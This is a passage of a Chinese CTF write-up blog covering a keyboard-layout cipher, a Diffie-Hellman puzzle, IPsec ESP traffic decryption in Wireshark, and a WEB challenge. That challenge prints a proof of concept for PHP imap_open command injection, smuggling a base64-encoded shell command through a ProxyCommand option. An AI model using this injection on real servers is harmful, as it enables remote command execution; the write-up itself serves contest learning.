+<p>题目的提示不好，原题目的提示是<code>键盘之争</code>，百度一下即可发现是考察键盘的两种布局方式<span class="exturl"><a class="exturl__link" href="http://www.ruanyifeng.com/blog/2006/11/disputation_of_keyboards_qwerty_or_dvorak.html" target="_blank" rel="noopener">链接</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>，按照两种方式一一对应即可</p>
+<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">QWERTY = [<span class="string">'q'</span>,<span class="string">'w'</span>,<span class="string">'e'</span>,<span class="string">'r'</span>,<span class="string">'t'</span>,<span class="string">'y'</span>,<span class="string">'u'</span>,<span class="string">'i'</span>,<span class="string">'o'</span>,<span class="string">'p'</span>,<span class="string">'&#123;'</span>,<span class="string">'&#125;'</span>,<span class="string">'|'</span>,<span class="string">'a'</span>,<span class="string">'s'</span>,<span class="string">'d'</span>,<span class="string">'f'</span>,<span class="string">'g'</span>,<span class="string">'h'</span>,<span class="string">'j'</span>,<span class="string">'k'</span>,<span class="string">'l'</span>,<span class="string">';'</span>,<span class="string">'"'</span>,<span class="string">'z'</span>,<span class="string">'x'</span>,<span class="string">'c'</span>,<span class="string">'v'</span>,<span class="string">'b'</span>,<span class="string">'n'</span>,<span class="string">'m'</span>,<span class="string">'&lt;'</span>,<span class="string">'&gt;'</span>,<span class="string">'?'</span>,<span class="string">'_'</span>,<span class="string">'+'</span>]</span><br><span class="line">Dvorak = [<span class="string">'"'</span>,<span class="string">'&lt;'</span>,<span class="string">'&gt;'</span>,<span class="string">'p'</span>,<span class="string">'y'</span>,<span class="string">'f'</span>,<span class="string">'g'</span>,<span class="string">'c'</span>,<span class="string">'r'</span>,<span class="string">'l'</span>,<span class="string">'?'</span>,<span class="string">'+'</span>,<span class="string">'|'</span>,<span class="string">'a'</span>,<span class="string">'o'</span>,<span class="string">'e'</span>,<span class="string">'u'</span>,<span class="string">'i'</span>,<span class="string">'d'</span>,<span class="string">'h'</span>,<span class="string">'t'</span>,<span class="string">'n'</span>,<span class="string">'s'</span>,<span class="string">'_'</span>,<span class="string">';'</span>,<span class="string">'q'</span>,<span class="string">'j'</span>,<span class="string">'k'</span>,<span class="string">'x'</span>,<span class="string">'b'</span>,<span class="string">'m'</span>,<span class="string">'w'</span>,<span class="string">'v'</span>,<span class="string">'z'</span>,<span class="string">'&#123;'</span>,<span class="string">'&#125;'</span>]</span><br><span class="line">dic = dict(zip(QWERTY,Dvorak))</span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line">s = <span class="string">'ypau_kjg;"g;"ypau+'</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line">    flag += dic[i]</span><br><span class="line">print(flag)</span><br></pre></td></tr></table></div></figure>
+<blockquote>
+<p>flag{this_is_flag}</p>
+</blockquote>
+
+        <h3 id="get-it">
+          <a href="#get-it" class="heading-link"><i class="fas fa-link"></i></a>get it</h3>
+      <blockquote>
+<p>Alice和Bob正在进行通信，作为中间人的Eve一直在窃听他们两人的通信。</p>
+<p>Eve窃听到这样一段内容，主要内容如下：<br>p = 37<br>A = 17<br>B = 31</p>
+<p>U2FsdGVkX1+mrbv3nUfzAjMY1kzM5P7ok/TzFCTFGs7ivutKLBLGbZxOfFebNdb2<br>l7V38e7I2ywU+BW/2dOTWIWnubAzhMN+jzlqbX6dD1rmGEd21sEAp40IQXmN/Y0O<br>K4nCu4xEuJsNsTJZhk50NaPTDk7J7J+wBsScdV0fIfe23pRg58qzdVljCOzosb62<br>7oPwxidBEPuxs4WYehm+15zjw2cw03qeOyaXnH/yeqytKUxKqe2L5fytlr6FybZw<br>HkYlPZ7JarNOIhO2OP3n53OZ1zFhwzTvjf7MVPsTAnZYc+OF2tqJS5mgWkWXnPal<br>+A2lWQgmVxCsjl1DLkQiWy+bFY3W/X59QZ1GEQFY1xqUFA4xCPkUgB+G6AC8DTpK<br>ix5+Grt91ie09Ye/SgBliKdt5BdPZplp0oJWdS8Iy0bqfF7voKX3VgTwRaCENgXl<br>VwhPEOslBJRh6Pk0cA0kUzyOQ+xFh82YTrNBX6xtucMhfoenc2XDCLp+qGVW9Kj6<br>m5lSYiFFd0E=</p>
+<p>分析得知，他们是在公共信道上交换加密密钥，共同建立共享密钥。</p>
+<p>而上面这段密文是Alice和Bob使用自己的密值和共享秘钥，组成一串字符的md5值的前16位字符作为密码使用另外一种加密算法加密明文得到的。</p>
+<p>例如Alice的密值为3，Bob的密值为6，共享秘钥为35，那么密码为：</p>
+<p>password = hashlib.md5(“(3,6,35)”).hexdigest()[0:16]</p>
+</blockquote>
+
+        <h1 id="二月月赛">
+          <a href="#二月月赛" class="heading-link"><i class="fas fa-link"></i></a>二月月赛</h1>
+      
+        <h2 id="WEB-1">
+          <a href="#WEB-1" class="heading-link"><i class="fas fa-link"></i></a>WEB</h2>
+      <p>注册登录，有个邮箱验证功能，验证之后新增一个改变背景的功能，允许图片上传，但是只允许上传jpg图片，查看源代码可以看到图片的存储位置<br><img src="https://i.loli.net/2019/02/28/5c778a7acd48e.png" alt><br>上传测试可以发现文件会被强制命名为<code>用户名.jpg</code>，截断什么的也不存在，当时就是做到这里没思路了，看了飘零学长的思路之后，知道了imap_open思路，该函数原型为</p>
+<figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">imap_open(string $mailbox, string $username, string $password [, int $options = <span class="number">0</span> [, int $n_retries = <span class="number">0</span> [, <span class="keyword">array</span> $params = <span class="keyword">NULL</span> ]]] ) : resource</span><br></pre></td></tr></table></div></figure>
+<p>漏洞在于$mailbox，用docker来测试一下</p>
+<figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">docker search imap</span><br><span class="line">docker pull fedosov&#x2F;docker-php-imap-composer</span><br><span class="line">docker run -itd fedosov&#x2F;docker-php-imap-composer &#x2F;bin&#x2F;bash</span><br><span class="line">docker attach id</span><br></pre></td></tr></table></div></figure>
+<p>写入一个实现漏洞测试函数<br><figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$payload = <span class="string">"echo skysky|tee /tmp/success"</span>;</span><br><span class="line">$encoded_payload = base64_encode($payload);</span><br><span class="line">$server = <span class="string">"any -o ProxyCommand=echo\t"</span>.$encoded_payload.<span class="string">"|base64\t-d|bash"</span>;</span><br><span class="line">@imap_open(<span class="string">'&#123;'</span>.$server.<span class="string">'&#125;:143/imap&#125;INBOX'</span>, <span class="string">''</span>, <span class="string">''</span>);</span><br></pre></td></tr></table></div></figure></p>
+<p>在执行之前/tmp目录为空，运行该文件之后生成了success文件，据此我们可以通过邮箱验证功能向/user目录中写入文件，</p>
+<p>但是实际操作失败了，不知道原因为何。</p>
+
+        <h2 id="MISC-4">
+          <a href="#MISC-4" class="heading-link"><i class="fas fa-link"></i></a>MISC</h2>
+      
+        <h3 id="非常简单的流量分析">
+          <a href="#非常简单的流量分析" class="heading-link"><i class="fas fa-link"></i></a>非常简单的流量分析</h3>
+      <figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http contains &quot;robots.txt&quot;</span><br></pre></td></tr></table></div></figure>
+<p>追踪http流可以看到存在abc.html页面，接续追踪该流量，查看abc.html页面内容</p>
+<blockquote>
+<p>md5 0x99a98e067af6b09e64f3740767096c96</p>
+<p>DES 0xb19b21e80c685bcb052988c11b987802d2f2808b2c2d8a0d  (129-&gt;143)</p>
+<p>DES 0x684a0857b767672d52e161aa70f6bdd07c0264876559cb8b  (143-&gt;129)</p>
+</blockquote>
+<p>当时做到这里僵住了，没有考虑后面的ESP流量包，看wp可知ESP是通过IpSec协议加密过的流量，需要解密流量包</p>
+<p>按照配置网上的思路配置一下esp秘钥，依次选择<code>编辑-&gt;首选项-&gt;Protocols-&gt;ESP</code></p>
+<p>添加配置信息，协议选择ipv4，源IP和目的IP填好，SPI在数据包里面有，Encrypt选择TripleDES-CBC，选择对应的des秘钥， authentication选择MD5，选择上面MD5值<br><img src="https://i.loli.net/2019/02/28/5c7779afb7a07.png" alt></p>
+<p>之后即可得到解密报文</p>
+<p>发现http报文有点特殊</p>
+<p><img src="https://i.loli.net/2019/02/28/5c7779ee0e7c4.png" alt></p>
+<p>可以看到前几位是flag的ascii码值，将此种类型数据包提取出来处理一下</p>
+<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'2.txt'</span>,<span class="string">'r'</span>) <span class="keyword">as</span> f:</span><br><span class="line">    content = f.read()</span><br><span class="line">    flag = <span class="string">''</span></span><br><span class="line">    par = re.findall(<span class="string">r'include/information/.*_(.*)\.php'</span>,content)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> par:</span><br><span class="line">        flag += chr(int(i))</span><br><span class="line">    print(flag)</span><br></pre></td></tr></table></div></figure>
+<p>flag：<code>flag{27b03b758f255276e5a98da0e1947bed}</code></p>
+</div><footer class="post-footer"><div class="post-ending ending"><div class="ending__text">------ END ------</div></div><div class="post-copyright copyright"><div class="copyright-author"><span class="copyright-author__name">Author: </span><span class="copyright-author__value"><a href="http://chaosec.top">Aesm1p</a></span></div><div class="copyright-link"><span class="copyright-link__name">Link: </span><span class="copyright-link__value"><a href="http://chaosec.top/2020/09/13/month-race/">http://chaosec.top/2020/09/13/month-race/</a></span></div><div class="copyright-notice"><span class="copyright-notice__name">Copyright: </span><span class="copyright-notice__value">All articles in this blog are licensed under <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en" rel="external nofollow" target="_blank">BY-NC-SA</a> unless stating additionally</span></div></div><div class="post-tags"><span class="post-tags-item"><span class="post-tags-item__icon"><i class="fas fa-tag"></i></span><a class="post-tags-item__link" href="http://chaosec.top/tags/CTF/">CTF</a></span></div><div class="post-reward reward"><div class="reward-button">Buy me a coffee</div><div class="reward-qrcode"><span class="reward-qrcode-alipay"><img class="reward-qrcode-alipay__img" src="/assets/reward-alipay.jpg"><div class="reward-qrcode-alipay__text">Alipay</div></span><span class="reward-qrcode-wechat"><img class="reward-qrcode-wechat__img" src="/assets/reward-wechat.png"><div class="reward-qrcode-wechat__text">Wechat</div></span></div></div><nav class="post-paginator paginator"><div class="paginator-prev"><a class="paginator-prev__link" href="/2020/09/13/DDCTF2019/"><span class="paginator-prev__icon"><i class="fas fa-angle-left"></i></span><span class="paginator-prev__text">DDCTF2019</span></a></div><div class="paginator-next"><a class="paginator-next__link" href="/2020/09/13/YJTZB2019/"><span class="paginator-prev__text">应急挑战杯2019复现</span><span class="paginator-next__icon"><i class="fas fa-angle-right"></i></span></a></div></nav></footer></div></div></div><div class="clearfix"></div></div></main><footer class="footer" id="footer"><div class="footer-inner"><div><span>Copyright © 2020</span><span class="footer__icon"><i class="fas fa-heart"></i></span><span>Aesm1p</span></div><div><span>Powered by <a href="http://hexo.io/" title="Hexo" target="_blank" rel="noopener">Hexo</a></span></div></div></footer><div class="loading-bar" id="loading-bar"><div class="loading-bar__progress"></div></div><div class="back2top" id="back2top"><span class="back2top__icon"><i class="fas fa-rocket"></i></span></div></div><div class="search-mask"></div><div class="search-popup"><span class="search-close"></span><div class="search-input"><input placeholder="Search for Posts (Support multiple keywords)"></div><div class="search-results"></div></div><script src="https://cdn.jsdelivr.net/npm/jquery@v3.4.1/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.ui.min.js"></script><script src="https://cdn.jsdelivr.net/npm/canvas-nest.js@1.0.1/dist/canvas-nest.min.js" color="255,165,0" opacity="0.6" count="99" zIndex="-1"></script><script src="https://cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js"></script><script>function initSearch() {
+  var isXML = true;
+  var search_path = 'search.json';
+
+  if (!search_path) {
+    search_path = 'search.xml';
+  } else if (/json$/i.test(search_path)) {
+    isXML = false;
+  }
+
+  var path = '/' + search_path;
+  $.ajax({
+    url: path,
+    dataType: isXML ? 'xml' : 'json',
+    async: true,
+    success: function (res) {
+      var datas = isXML ? $('entry', res).map(function () {
+        // 将 XML 转为 JSON
+        return {
+          title: $('title', this).text(),
+          content: $('content', this).text(),
+          url: $('url', this).text()
+        };
+      }).get() : res;
+      var $input = $('.search-input input');
+      var $result = $('.search-results');
+      // 搜索对象（标题、内容）的权重，影响显示顺序
+      var WEIGHT = { title: 100, content: 1 };
+      var searchPost = function () {
+        var searchText = $input.val().toLowerCase().trim();
+        // 根据空白字符分隔关键字
+        var keywords = searchText.split(/[\s]+/);
+        // 搜索结果
+        var matchPosts = [];
+
+        // 有多个关键字时，将原文字整个保存下来
+        if (keywords.length > 1) {
+          keywords.push(searchText);
+        }
+        // 防止未输入字符时搜索
+        if (searchText.length > 0) {
+          datas.forEach(function (data) {
+            var isMatch  = false;
+            // 没有标题的文章使用预设的 i18n 变量代替
+            var title = (data.title && data.title.trim()) || '[ Untitled ]';
+            var titleLower = title && title.toLowerCase();
+            // 删除 HTML 标签 和 所有空白字符
+            var content = data.content && data.content.replace(/<[^>]+>/g, '');
+            var contentLower = content && content.toLowerCase();
+            // 删除重复的 /
+            var postURL = data.url && decodeURI(data.url).replace(/\/{2,}/g, '/');
+            // 标题中匹配到的关键词
+            var titleHitSlice = [];
+            // 内容中匹配到的关键词
+            var contentHitSlice = [];
+
+            keywords.forEach(function (keyword) {
+              /**
+              * 获取匹配的关键词的索引
+              * @param {String} keyword 要匹配的关键字
+              * @param {String} text 原文字
+              * @param {Boolean} caseSensitive 是否区分大小写
+              * @param {Number} weight 匹配对象的权重。权重大的优先显示
+              * @return {Array}
+              */
+              function getIndexByword (word, text, caseSensitive, weight) {
+                if (!word || !text) {
+                  return [];
+                };
+
+                var startIndex = 0; // 每次匹配的开始索引
+                var index = -1;     // 匹配到的索引值
+                var result = [];    // 匹配结果
+
+                if (!caseSensitive) {
+                  word = word.toLowerCase();
+                  text = text.toLowerCase();
+                }
+
+                while((index = text.indexOf(word, startIndex)) !== -1) {
+                  var hasMatch = false;
+                  // 索引位置相同的关键词，保留长度较长的
+                  titleHitSlice.forEach(function (hit) {
+                    if (hit.index === index && hit.word.length < word.length) {
+                      hit.word = word;
+                      hasMatch = true;
+                    }
+                  });
+                  startIndex = index + word.length;
+                  !hasMatch && result.push({ index: index, word: word, weight: weight });
+                }
+                return result;
+              }
+              titleHitSlice = titleHitSlice.concat(getIndexByword(keyword, titleLower, false, WEIGHT.title));
+              contentHitSlice = contentHitSlice.concat(getIndexByword(keyword, contentLower, false, WEIGHT.content));
+            });
+
+            var hitTitle = titleHitSlice.length;
+            var hitContent = contentHitSlice.length;
+
+            if (hitTitle > 0 || hitContent > 0) {
+              isMatch = true;
+            }
+            if (isMatch) {
+              ;[titleHitSlice, contentHitSlice].forEach(function (hit) {
+                // 按照匹配文字的索引的递增顺序排序
+                hit.sort(function (left, right) {
+                  return left.index - right.index;
+                });
+              });
+              /**
+              * 给文本中匹配到的关键词添加标记，从而进行高亮显示
+              * @param {String} text 原文本
+              * @param {Array} hitSlice 匹配项的索引信息
+              * @param {Number} start 开始索引
+              * @param {Number} end 结束索引
+              * @return {String}
+              */
+              function highlightKeyword (text, hitSlice, start, end) {
+                if (!text || !hitSlice || !hitSlice.length) {
+                  return;
+                }
+
+                var result = '';
+                var startIndex = start;
+                var endIndex = end;
+                hitSlice.forEach(function (hit) {
+                  if (hit.index < startIndex) {
+                    return;
+                  }
+
+                  var hitWordEnd = hit.index + hit.word.length;
+                  result += text.slice(startIndex, hit.index);
+                  result += '<b>' + text.slice(hit.index, hitWordEnd) + '</b>';
+                  startIndex = hitWordEnd;
+                });
+                result += text.slice(startIndex, endIndex);
+                return result;
+              }
+
+              var postData = {};
+              // 文章总的搜索权重
+              var postWeight = titleHitSlice.length * WEIGHT.title + contentHitSlice.length * WEIGHT.content;
+              // 标记匹配关键词后的标题
+              var postTitle = highlightKeyword(title, titleHitSlice, 0, title.length) || title;
+              // 标记匹配关键词后的内容
+              var postContent;
+              // 显示内容的长度
+              var SHOW_WORD_LENGTH = 200;
+              // 命中关键词前的字符显示长度
+              var SHOW_WORD_FRONT_LENGTH = 20;
+              var SHOW_WORD_END_LENGTH = SHOW_WORD_LENGTH - SHOW_WORD_FRONT_LENGTH;
+
+              // 截取匹配的第一个字符，前后共 200 个字符来显示
+              if (contentHitSlice.length > 0) {
+                var firstIndex = contentHitSlice[0].index;
+                var start = firstIndex > SHOW_WORD_FRONT_LENGTH ? firstIndex - SHOW_WORD_FRONT_LENGTH : 0;
+                var end = firstIndex + SHOW_WORD_END_LENGTH;
+                postContent = highlightKeyword(content, contentHitSlice, start, end);
+              } else { // 未匹配到内容，直接截取前 200 个字符来显示
+                postContent = content.slice(0, SHOW_WORD_LENGTH);
+              }
+              postData.title = postTitle;
+              postData.content = postContent;
+              postData.url = postURL;
+              postData.weight = postWeight;
+              matchPosts.push(postData);
+            }
+          });
+        }
+
+        var resultInnerHtml = '';
+        if (matchPosts.length) {
+          // 按权重递增的顺序排序，使权重大的优先显示
+          matchPosts.sort(function (left, right) {
+            return right.weight - left.weight;
+          });
+          resultInnerHtml += '<ul>';
+          matchPosts.forEach(function (post) {
+            resultInnerHtml += '<li><a class="search-results-title" href="' + post.url + '">';
+            resultInnerHtml += post.title;
+            resultInnerHtml += '</a><div class="search-results-content">';
+            resultInnerHtml += post.content;
+            resultInnerHtml += '</div></li>';
+          });
+          resultInnerHtml += '</ul>';
+        } else {
+          resultInnerHtml += '<div class="search-results-none"><i class="far fa-meh"></i></div>';
+        }
+        $result.html(resultInnerHtml);
+      };
+      $input.on('input', searchPost);
+      $input.on('keyup', function (e) {
+        if (e.keyCode === Stun.utils.codeToKeyCode('Enter')) {
+          searchPost();
+        }
+      });
+    }
+  });
+}
+
+function closeSearch () {
+  $('body').css({ overflow: 'auto' });
+  $('.search-popup').css({ display: 'none' });
+  $('.search-mask').css({ display: 'none' });
+}
+
+window.addEventListener('DOMContentLoaded', function () {
+  Stun.utils.pjaxReloadLocalSearch = function () {
+    $('.header-nav-search').on('click', function (e) {
+      e.stopPropagation();
+      $('body').css('overflow', 'hidden');
+      $('.search-popup')
+        .velocity('stop')
+        .velocity('transition.expandIn', {
+          duration: 300,
+          complete: function () {
+            $('.search-popup input').focus();
+          }
+        });
+      $('.search-mask')
+        .velocity('stop')
+        .velocity('transition.fadeIn', {
+          duration: 300
+        });
+
+      initSearch();
+    });
+    $('.search-mask, .search-close').on('click', function () {
+      closeSearch();
+    });
+    $(document).on('keydown', function (e) {
+      // Escape <=> 27
+      if (e.keyCode === Stun.utils.codeToKeyCode('Escape')) {
+        closeSearch();
+      }
+    });
+  };
+
+  Stun.utils.pjaxReloadLocalSearch();
+}, false);</script><script src="/js/utils.js?v=2.1.1"></script><script src="/js/stun-boot.js?v=2.1.1"></script><script src="/js/scroll.js?v=2.1.1"></script><script src="/js/header.js?v=2.1.1"></script><script type="application/json" src="/search.json"></script></body></html>
